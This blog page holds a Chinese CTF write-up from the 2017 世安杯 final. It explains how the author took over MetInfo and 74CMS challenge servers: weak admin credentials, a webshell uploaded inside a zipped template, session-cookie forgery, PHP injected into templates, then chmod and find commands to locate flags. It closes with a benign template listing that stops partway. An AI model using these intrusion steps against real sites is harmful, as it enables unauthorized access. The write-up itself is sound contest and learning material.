<!DOCTYPE html>
<html lang="pt">

  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>[2017世安杯] 决赛Writeup | Pr0ph3t's blog</title>

    <!-- Bootstrap -->
    <link rel="stylesheet" href="/assets/css/bootstrap-3.3.6/css/bootstrap.min.css">
    <link rel="stylesheet" href="/assets/css/main.css">
    <link rel="stylesheet" href="https://libs.cdnjs.net/fancybox/3.5.7/jquery.fancybox.min.css">

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
        <![endif]-->
    <link rel="shortcut icon" href="/assets/images/favicon.png">

    <link rel="alternate" type="application/atom+xml" title="Atom Feed" href="/feed/"> 

</head>


    <body>
      <div class="container">

        <header class="row">
  <div class="col-lg-8 col-lg-offset-2">
    <h1 class="">Pr0ph3t</h1>
    <p>
    <span class="reserved">char</span> nick[<span class="number">7</span>] = <span class="string">"Pr0ph3t"</span>;
    </p>
    <p>
    printf(<a href="https://github.com/t3hp0rP" target="_blank"><span class="string">"https://github.com/<span class="reserved">%s\n</span>"</span></a>,nick);
    </p>
    <p>
    printf(<span class="string">"<span class="reserved">%s\x40</span>pr0ph3t<span class="reserved">\x2e\\\b</span>com<span class="reserved">\n</span>"</span>,<span class="string">"admin"</span>);
    </p>
    <!-- <p>
            printf(<a href="https://blog.pr0ph3t.com" target="_blank"><span class="string">"https://<span class="reserved">%s</span>.pr0ph3t.com<span class="reserved">\n</span>"</span></a>,nick);
        </p> -->
    <p>
    puts(<a href="/assets/misc/pubkey.gpg.txt" target="_blank"><span class="string">"91B6 191A C2C3 285C 201D  801B B5A3 6B56 8528 E140"</span></a>);
    </p>
  </div>
</header>

<div class="row">
  <div class="col-lg-8 col-lg-offset-2">
    <div class="menu">
      <ul>
          <li><a href="/">home</a></li>
          <li><a href="/articles/">articles</a></li>
          <li><a href="/friendlink">friends</a></li>
      </ul>
    </div>
  </div>
</div>



        <div class="row">
          <div class="col-lg-8 col-lg-offset-2">
            <main>
            <div class="post">

  <header class="post-header">
    <h1>[2017世安杯] 决赛Writeup</h1>
  </header>

  <article class="post-content">
  <div class="post">

  <header class="post-header">
    <p class="meta">
        Oct 11, 2017
        
        
        •
        <span><a href="/category/#CyberSecurity" class="reserved">CyberSecurity</a>,</span><span><a href="/category/#Attack&Defense" class="reserved">Attack&Defense</a>,</span><span><a href="/category/#old" class="reserved">old</a></span>
        
          <span id="/posts/%E4%B8%96%E5%AE%89%E6%9D%AF-%E5%86%B3%E8%B5%9BWriteup/" class="leancloud_visitors" data-flag-title="[2017世安杯] 决赛Writeup">
            Page view:
            <span class="leancloud-visitors-count"></span>
          </span>
        
    </p>
  </header>

  <article class="post-content">
  <p>今天折磨了一天感冒和头痛的身躯。。。。写完倒头就睡。。。。</p>

<p>今天决赛分为：</p>
<ul>
  <li>上午的综合渗透(个人更觉得是CTF)因为讲道理貌似三个题目服务器之间是互相不可达的。。。。。</li>
  <li>下午的AWD(很不意外 还是只有一题)</li>
</ul>

<p>上午的综合渗透是三个cms，分别是MetInfo 5.x、骑士CMS、还有一个easycms。。(版本号真的不记得了。。)</p>

<h4 id="首先第一题metinfo">首先第一题MetInfo</h4>
<ul>
  <li>cookie处一个flag</li>
  <li>robots.txt处一个flag</li>
  <li>弱密码admin —- MetInfo 进入后台</li>
  <li>看到有个模版上传， 只允许上传zip等等，后缀限定得很死，发现他里面的模版都是以很多文件的形式存在，那么可以很合理的猜测他这里会有解压这一个操作，所以构造一个一句话，然后打包成zip上传模版，发现php被解压出来在templates目录下，getshell，直接上菜刀，这是一个windows的题，Orz这里就一开始有点难办了。。不太懂windows的命令。</li>
  <li>在User目录下的flag4文件夹发现一个flag</li>
  <li>在网站部署目录下的upload\file里看到一个flag</li>
  <li>另外还有一个忘记在哪找的了。。。是一个名字为flag5.png的文件，hexdump后发现flag5</li>
</ul>

<h4 id="第二题骑士cms">第二题骑士CMS</h4>
<ul>
  <li>服务器设置不当导致部分目录遍历 （不存在index.php index.html的文件夹 具体apache配置项是Directory的Indexes）</li>
  <li>cookie处一个flag</li>
  <li>robots.txt处一个flag //貌似是</li>
  <li>在遍历的时候发现了PHP的session储存点，翻看之后看到带有admin记录的session值，果断document.cookie=”PHPSESSID=xxx”伪造一波，成功登录后台</li>
  <li>在后台处发现了模版编辑，是编辑htm文件，但是里面有很多类似于laravel的blade模版引擎的mustache写法，也就是<code class="highlighter-rouge">&amp;#123;&amp;#123;  &amp;#125;&amp;#125;</code>之类的，猜测这里是可以直接加入php执行的，直接加入<code class="highlighter-rouge"><span class="cp">&lt;?php</span> <span class="nb">phpinfo</span><span class="p">();</span><span class="cp">?&gt;</span></code> 成功执行，然后就开始getshell翻翻翻flag了</li>
  <li>apache运行用户叫apache</li>
  <li>首先在网站部署根目录下发现一个AAAAAAAAflag.txt文件得到一个flag</li>
  <li>其次在服务器根目录下有一个/flag文件夹，虽然是被设置成了700，但是owner是apache，直接chmod 777 后进入目录查看.flag.txt文件得到一个flag</li>
  <li>最后执行find / -name flag的时候在/var/lib/mysql/处发现了有一个flag文件夹，这次owner是mysql并没有读权限，cat /etc/group 的时候发现mysql是单独一个组的，这里想到了提权。。。但是没有怎么操作过。。。所以放弃了</li>
</ul>

<p>附上一部分模版源码:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;</span>
<span class="nt">&lt;html</span> <span class="na">xmlns=</span><span class="s">"http://www.w3.org/1999/xhtml"</span><span class="nt">&gt;</span>
<span class="nt">&lt;head&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"Content-Type"</span> <span class="na">content=</span><span class="s">"text/html; charset=gb2312"</span> <span class="nt">/&gt;</span>{#qishi_pageinfo set="列表名:page,调用:QS_index"#}
<span class="nt">&lt;title&gt;</span>Welcome 74CMS<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"description"</span> <span class="na">content=</span><span class="s">"{#$page.description#}"</span><span class="nt">&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"keywords"</span> <span class="na">content=</span><span class="s">"{#$page.keywords#}"</span><span class="nt">&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"X-UA-Compatible"</span> <span class="na">content=</span><span class="s">"edge"</span><span class="nt">&gt;</span>
<span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"shortcut icon"</span> <span class="na">href=</span><span class="s">"{#$QISHI.site_dir#}favicon.ico"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"author"</span> <span class="na">content=</span><span class="s">"骑士CMS"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"copyright"</span> <span class="na">content=</span><span class="s">"74cms.com"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"{#$QISHI.site_template#}css/common.css"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"{#$QISHI.site_template#}css/index.css"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"{#$QISHI.site_template#}js/jquery.js"</span> <span class="na">type=</span><span class="s">"text/javascript"</span> <span class="na">language=</span><span class="s">"javascript"</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"{#$QISHI.site_template#}js/index_foucs.js"</span> <span class="na">type=</span><span class="s">"text/javascript"</span> <span class="na">language=</span><span class="s">"javascript"</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"{#$QISHI.site_template#}js/jquery.dropDownWidget.js"</span> <span class="na">type=</span><span class="s">"text/javascript"</span> <span class="na">language=</span><span class="s">"javascript"</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"{#$QISHI.site_template#}js/jquery.newindex.js"</span> <span class="na">type=</span><span class="s">"text/javascript"</span> <span class="na">language=</span><span class="s">"javascript"</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"{#$QISHI.site_template#}js/jquery.lazyload.js"</span> <span class="na">type=</span><span class="s">"text/javascript"</span> <span class="na">language=</span><span class="s">"javascript"</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"{#$QISHI.site_template#}js/jquery.autocomplete.js"</span> <span class="na">type=</span><span class="s">"text/javascript"</span> <span class="na">language=</span><span class="s">"javascript"</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"{#$QISHI.site_dir#}data/cache_classify.js"</span> <span class="na">type=</span><span class="s">"text/javascript"</span> <span class="na">charset=</span><span class="s">"utf-8"</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
<span class="nx">jQuery</span><span class="p">(</span><span class="nb">document</span><span class="p">).</span><span class="nx">ready</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">$</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">//选项卡切换</span>
  <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">.n-tab-control&gt;a</span><span class="dl">"</span><span class="p">).</span><span class="nx">each</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
    <span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">click</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
      <span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">addClass</span><span class="p">(</span><span class="dl">"</span><span class="s2">select</span><span class="dl">"</span><span class="p">);</span>
      <span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">siblings</span><span class="p">(</span><span class="dl">"</span><span class="s2">a</span><span class="dl">"</span><span class="p">).</span><span class="nx">removeClass</span><span class="p">(</span><span class="dl">"</span><span class="s2">select</span><span class="dl">"</span><span class="p">);</span>
      <span class="kd">var</span> <span class="nx">bull_index</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">.n-tab-control&gt;a</span><span class="dl">"</span><span class="p">).</span><span class="nx">index</span><span class="p">(</span><span class="k">this</span><span class="p">);</span>
      <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">.news-tab-box&gt;ul</span><span class="dl">"</span><span class="p">).</span><span class="nx">eq</span><span class="p">(</span><span class="nx">bull_index</span><span class="p">).</span><span class="nx">show</span><span class="p">().</span><span class="nx">siblings</span><span class="p">().</span><span class="nx">hide</span><span class="p">();</span>
    <span class="p">})</span>
  <span class="p">});</span>
  <span class="c1">//登录</span>
  <span class="nx">$</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">{#$QISHI.site_dir#}plus/ajax_user.php?act=loginform</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#ajax_login</span><span class="dl">"</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
    <span class="c1">// 选择登录方式</span>
    <span class="kd">var</span> <span class="nx">wxrun</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
    <span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">.loginicon</span><span class="dl">'</span><span class="p">).</span><span class="nx">toggle</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
      <span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#pcLogin</span><span class="dl">'</span><span class="p">).</span><span class="nx">hide</span><span class="p">();</span>
      <span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#codeLogin</span><span class="dl">'</span><span class="p">).</span><span class="nx">show</span><span class="p">();</span>
      <span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#login-box h1</span><span class="dl">'</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="dl">'</span><span class="s1">微信登录</span><span class="dl">'</span><span class="p">);</span>
      <span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">attr</span><span class="p">(</span><span class="dl">'</span><span class="s1">title</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">用户名登录</span><span class="dl">'</span><span class="p">);</span>
      <span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">removeClass</span><span class="p">(</span><span class="dl">'</span><span class="s1">wx</span><span class="dl">'</span><span class="p">).</span><span class="nx">addClass</span><span class="p">(</span><span class="dl">'</span><span class="s1">pc</span><span class="dl">'</span><span class="p">);</span>
      <span class="p">{</span><span class="err">#</span><span class="k">if</span> <span class="nx">$QISHI</span><span class="p">.</span><span class="nx">weixin_apiopen</span><span class="o">==</span><span class="dl">'</span><span class="s1">1</span><span class="dl">'</span> <span class="o">&amp;&amp;</span> <span class="nx">$QISHI</span><span class="p">.</span><span class="nx">weixin_scan_login</span><span class="o">==</span><span class="dl">'</span><span class="s1">1</span><span class="dl">'</span> <span class="o">&amp;&amp;</span> <span class="nx">$smarty</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">username</span><span class="o">==</span><span class="dl">''</span><span class="err">#</span><span class="p">}</span>
      <span class="nx">wxrun</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">setInterval</span><span class="p">(</span><span class="nx">run</span><span class="p">,</span> <span class="mi">5000</span><span class="p">);</span>
      <span class="kd">function</span> <span class="nx">run</span><span class="p">(){</span>
          <span class="nx">$</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">{#$QISHI.site_dir#}m/login.php?act=waiting_weixin_login</span><span class="dl">"</span><span class="p">,</span><span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">){</span>
              <span class="k">if</span><span class="p">(</span><span class="nx">data</span><span class="o">==</span><span class="dl">"</span><span class="s2">1</span><span class="dl">"</span><span class="p">){</span>
                 <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="dl">"</span><span class="s2">{#$QISHI.site_dir#}</span><span class="dl">"</span><span class="p">;</span>
              <span class="p">}</span>
          <span class="p">});</span>
      <span class="p">}</span>
      <span class="p">{</span><span class="err">#</span><span class="o">/</span><span class="k">if</span><span class="err">#</span><span class="p">}</span>
    <span class="p">},</span> <span class="kd">function</span><span class="p">(){</span>
      <span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#pcLogin</span><span class="dl">'</span><span class="p">).</span><span class="nx">show</span><span class="p">();</span>
      <span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#codeLogin</span><span class="dl">'</span><span class="p">).</span><span class="nx">hide</span><span class="p">();</span>
      <span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#login-box h1</span><span class="dl">'</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="dl">'</span><span class="s1">会员登录</span><span class="dl">'</span><span class="p">);</span>
      <span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">attr</span><span class="p">(</span><span class="dl">'</span><span class="s1">title</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">微信登录</span><span class="dl">'</span><span class="p">);</span>
      <span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">removeClass</span><span class="p">(</span><span class="dl">'</span><span class="s1">pc</span><span class="dl">'</span><span class="p">).</span><span class="nx">addClass</span><span class="p">(</span><span class="dl">'</span><span class="s1">wx</span><span class="dl">'</span><span class="p">);</span>
      <span class="p">{</span><span class="err">#</span><span class="k">if</span> <span class="nx">$QISHI</span><span class="p">.</span><span class="nx">weixin_apiopen</span><span class="o">==</span><span class="dl">'</span><span class="s1">1</span><span class="dl">'</span> <span class="o">&amp;&amp;</span> <span class="nx">$QISHI</span><span class="p">.</span><span class="nx">weixin_scan_login</span><span class="o">==</span><span class="dl">'</span><span class="s1">1</span><span class="dl">'</span> <span class="o">&amp;&amp;</span> <span class="nx">$smarty</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">username</span><span class="o">==</span><span class="dl">''</span><span class="err">#</span><span class="p">}</span>
      <span class="nb">window</span><span class="p">.</span><span class="nx">clearInterval</span><span class="p">(</span><span class="nx">wxrun</span><span class="p">);</span>
      <span class="p">{</span><span class="err">#</span><span class="o">/</span><span class="k">if</span><span class="err">#</span><span class="p">}</span>
    <span class="p">});</span>
  <span class="p">});</span>
  <span class="c1">// 左侧下拉</span>
  <span class="nx">$</span><span class="p">.</span><span class="nx">dropDownWidget</span><span class="p">(</span><span class="dl">"</span><span class="s2">.job-sort-wrap</span><span class="dl">"</span><span class="p">);</span>
  <span class="c1">// 首页的一些js</span>
  <span class="nx">index</span><span class="p">(</span><span class="dl">"</span><span class="s2">{#$QISHI.site_dir#}</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">{#$QISHI.site_template#}</span><span class="dl">"</span><span class="p">);</span>
  <span class="c1">// 工作地区填充数据</span>
  <span class="nx">city_filldata</span><span class="p">(</span><span class="dl">"</span><span class="s2">#city_list</span><span class="dl">"</span><span class="p">,</span> <span class="nx">QS_city_parent</span><span class="p">,</span> <span class="nx">QS_city</span><span class="p">,</span> <span class="dl">"</span><span class="s2">#result-list-city</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">#aui_outer_city</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">#cityForIndexSearch</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">#citycategory</span><span class="dl">"</span><span class="p">);</span>
  <span class="c1">//</span>
  <span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">.floor-item:first</span><span class="dl">'</span><span class="p">).</span><span class="nx">find</span><span class="p">(</span><span class="dl">'</span><span class="s1">.floor-title</span><span class="dl">'</span><span class="p">).</span><span class="nx">css</span><span class="p">({</span><span class="dl">'</span><span class="s1">margin-top</span><span class="dl">'</span><span class="p">:</span><span class="mi">5</span><span class="p">});</span>
  <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">.core-function</span><span class="dl">"</span><span class="p">).</span><span class="nx">live</span><span class="p">(</span><span class="dl">'</span><span class="s1">click</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
    <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">attr</span><span class="p">(</span><span class="dl">"</span><span class="s2">code</span><span class="dl">"</span><span class="p">);</span>
  <span class="p">});</span>
<span class="p">});</span>
<span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body</span> <span class="err">{</span><span class="na">#if</span> <span class="err">$</span><span class="na">QISHI</span><span class="err">.</span><span class="na">body_bgimg#</span><span class="err">}</span><span class="na">style=</span><span class="s">"background:url({#$QISHI.site_domain#}{#$QISHI.site_dir#}data/{#$QISHI.updir_images#}/{#$QISHI.body_bgimg#}) repeat-x center 38px;"</span><span class="err">{</span><span class="na">#</span><span class="err">/</span><span class="na">if#</span><span class="err">}</span><span class="nt">&gt;</span>
{#include file="header.htm"#}
<span class="c">&lt;!-- 主体 --&gt;</span>
<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container-index"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"complex-main clearfix"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"complex-left f-left"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"job-sort-wrap"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"job-sort-control"</span><span class="nt">&gt;</span>全部职位分类<span class="nt">&lt;i</span> <span class="na">class=</span><span class="s">"sotr-icon"</span><span class="nt">&gt;&lt;/i&gt;&lt;/div&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"job-sort-list"</span><span class="nt">&gt;&lt;/div&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"leftmenu_box"</span><span class="nt">&gt;&lt;/div&gt;</span>
      <span class="nt">&lt;/div&gt;</span>
      <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"bolck-nav clearfix"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"b-nav-item f-left"</span> <span class="na">href=</span><span class="s">"{#$QISHI.site_dir#}jobs"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>
          <span class="nt">&lt;i</span> <span class="na">class=</span><span class="s">"b-nav-icon icon1"</span><span class="nt">&gt;&lt;/i&gt;</span>
          <span class="nt">&lt;p&gt;</span>找工作<span class="nt">&lt;/p&gt;</span>
        <span class="nt">&lt;/a&gt;</span>
        <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"b-nav-item f-left"</span> <span class="na">href=</span><span class="s">"{#$QISHI.site_dir#}resume"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>
          <span class="nt">&lt;i</span> <span class="na">class=</span><span class="s">"b-nav-icon icon2"</span><span class="nt">&gt;&lt;/i&gt;</span>
          <span class="nt">&lt;p&gt;</span>找人才<span class="nt">&lt;/p&gt;</span>
        <span class="nt">&lt;/a&gt;</span>
        <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"b-nav-item f-left"</span> <span class="na">href=</span><span class="s">"{#$QISHI.site_dir#}user/company/company_jobs.php?act=addjobs"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>
          <span class="nt">&lt;i</span> <span class="na">class=</span><span class="s">"b-nav-icon icon9"</span><span class="nt">&gt;&lt;/i&gt;</span>
          <span class="nt">&lt;p&gt;</span>发职位<span class="nt">&lt;/p&gt;</span>
        <span class="nt">&lt;/a&gt;</span>
        <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"b-nav-item f-left"</span> <span class="na">href=</span><span class="s">"{#$QISHI.site_dir#}user/personal/personal_resume.php?act=make1"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>
          <span class="nt">&lt;i</span> <span class="na">class=</span><span class="s">"b-nav-icon icon4"</span><span class="nt">&gt;&lt;/i&gt;</span>
          <span class="nt">&lt;p&gt;</span>创简历<span class="nt">&lt;/p&gt;</span>
        <span class="nt">&lt;/a&gt;</span>
        <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"b-nav-item f-left"</span> <span class="na">href=</span><span class="s">"{#"</span><span class="na">QS_simplelist</span><span class="err">"|</span><span class="na">qishi_url#</span><span class="err">}"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>
          <span class="nt">&lt;i</span> <span class="na">class=</span><span class="s">"b-nav-icon icon5"</span><span class="nt">&gt;&lt;/i&gt;</span>
          <span class="nt">&lt;p&gt;</span>微商圈<span class="nt">&lt;/p&gt;</span>
        <span class="nt">&lt;/a&gt;</span>
        <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"b-nav-item f-left"</span> <span class="na">href=</span><span class="s">"{#"</span><span class="na">QS_hrtoolsindex</span><span class="err">"|</span><span class="na">qishi_url#</span><span class="err">}"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>
          <span class="nt">&lt;i</span> <span class="na">class=</span><span class="s">"b-nav-icon icon6"</span><span class="nt">&gt;&lt;/i&gt;</span>
          <span class="nt">&lt;p&gt;</span>HR工具<span class="nt">&lt;/p&gt;</span>
        <span class="nt">&lt;/a&gt;</span>
      <span class="nt">&lt;/div&gt;</span>
      <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"news-tab"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"n-tab-control clearfix"</span><span class="nt">&gt;</span>
          <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"javascript:;"</span> <span class="na">class=</span><span class="s">"f-left tab-ctrl select"</span><span class="nt">&gt;</span>公告<span class="nt">&lt;/a&gt;</span>
          <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"javascript:;"</span> <span class="na">class=</span><span class="s">"f-left tab-ctrl"</span><span class="nt">&gt;</span>资讯<span class="nt">&lt;/a&gt;</span>
          <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"javascript:;"</span> <span class="na">class=</span><span class="s">"f-left tab-ctrl"</span><span class="nt">&gt;</span>帮助<span class="nt">&lt;/a&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"news-tab-box"</span><span class="nt">&gt;</span>
          <span class="c">&lt;!-- 公告 --&gt;</span>
          <span class="nt">&lt;ul&gt;</span>
            {#qishi_notice_list set="列表名:notice,显示数目:9,标题长度:12,分类:1,填补字符:..."#}
            {#foreach from=$notice item=list#}
            <span class="nt">&lt;li&gt;&lt;i</span> <span class="na">class=</span><span class="s">"tab-icon"</span><span class="nt">&gt;&lt;/i&gt;&lt;a</span> <span class="na">href=</span><span class="s">"{#$list.url#}"</span> <span class="na">target=</span><span class="s">"_blank"</span> <span class="na">title=</span><span class="s">"{#$list.title_#}"</span> <span class="na">class=</span><span class="s">"underline"</span><span class="nt">&gt;</span>{#$list.title#}<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
            {#/foreach#}
          <span class="nt">&lt;/ul&gt;</span>
          <span class="c">&lt;!-- 资讯 --&gt;</span>
          <span class="nt">&lt;ul</span> <span class="na">style=</span><span class="s">"display: none;"</span><span class="nt">&gt;</span>
            {#qishi_news_list set="列表名:news,显示数目:9,标题长度:12,分类:1,填补字符:...,排序:id&gt;desc"#}
            {#foreach from=$news item=list#}
            <span class="nt">&lt;li&gt;&lt;i</span> <span class="na">class=</span><span class="s">"tab-icon"</span><span class="nt">&gt;&lt;/i&gt;&lt;a</span> <span class="na">href=</span><span class="s">"{#$list.url#}"</span> <span class="na">target=</span><span class="s">"_blank"</span> <span class="na">title=</span><span class="s">"{#$list.title_#}"</span> <span class="na">class=</span><span class="s">"underline"</span><span class="nt">&gt;</span>{#$list.title#}<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
            {#/foreach#}
          <span class="nt">&lt;/ul&gt;</span>
          <span class="c">&lt;!-- 帮助 --&gt;</span>
          <span class="nt">&lt;ul</span> <span class="na">style=</span><span class="s">"display: none;"</span><span class="nt">&gt;</span>
            {#qishi_help_list set="列表名:help,显示数目:9,标题长度:12,填补字符:..."#}
            {#foreach from=$help item=list#}
            <span class="nt">&lt;li&gt;&lt;i</span> <span class="na">class=</span><span class="s">"tab-icon"</span><span class="nt">&gt;&lt;/i&gt;&lt;a</span> <span class="na">href=</span><span class="s">"{#$list.url#}"</span> <span class="na">target=</span><span class="s">"_blank"</span> <span class="na">title=</span><span class="s">"{#$list.title_#}"</span> <span class="na">class=</span><span class="s">"underline"</span><span class="nt">&gt;</span>{#$list.title#}<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
            {#/foreach#}
          <span class="nt">&lt;/ul&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
      <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"complex-center f-left"</span><span class="nt">&gt;</span>
      <span class="c">&lt;!-- 搜索 --&gt;</span>
      <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"search-wrap clearfix"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"search-box f-left"</span><span class="nt">&gt;</span>
          <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"search-type f-left"</span><span class="nt">&gt;</span>
